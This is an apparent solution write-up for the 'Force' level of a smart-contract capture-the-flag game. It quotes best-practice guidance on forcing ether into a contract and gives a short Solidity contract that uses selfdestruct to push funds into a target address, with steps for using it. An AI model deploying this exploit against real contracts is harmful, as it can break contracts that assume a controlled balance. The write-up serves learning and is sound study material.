# 7. Force
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

    Fallback methods
    Sometimes the best way to attack a contract is with another contract.
    See the Help page above, section "Beyond the console"

https://consensys.github.io/smart-contract-best-practices/recommendations/
"An attacker can forcibly send ether to any account and this cannot be prevented (not even with a fallback function that does a `revert()`).

The attacker can do this by creating a contract, funding it with 1 wei, and invoking `selfdestruct(victimAddress)`. No code is invoked in `victimAddress`, so it cannot be prevented. This is also true for block reward which is sent to the address of the miner, which can be any arbitrary address."

ForceNewBalance.sol
```
// SPDX-License-Identifier: MIT                                                 pragma solidity ^0.6.0;                                                                                                                                         contract ForceNewBalance {

	receive() external payable {}                                                 
	function getBalance() public view returns (uint) {
		return address(this).balance;                                           
	}
	
	function forceSend(address payable _address) public payable {           
	
		selfdestruct(_address);
	}
}

```
- create contract
- send eth
- use forceSend(targetAddress) to invoke selfdestruct(targetAddress)

**END**
An attacker can forcibly send ether to any account and this cannot be prevented (not even with a fallback function that does a `revert()`).

The attacker can do this by creating a contract, funding it with 1 wei, and invoking `selfdestruct(victimAddress)`. No code is invoked in `victimAddress`, so it cannot be prevented. This is also true for block reward which is sent to the address of the miner, which can be any arbitrary address.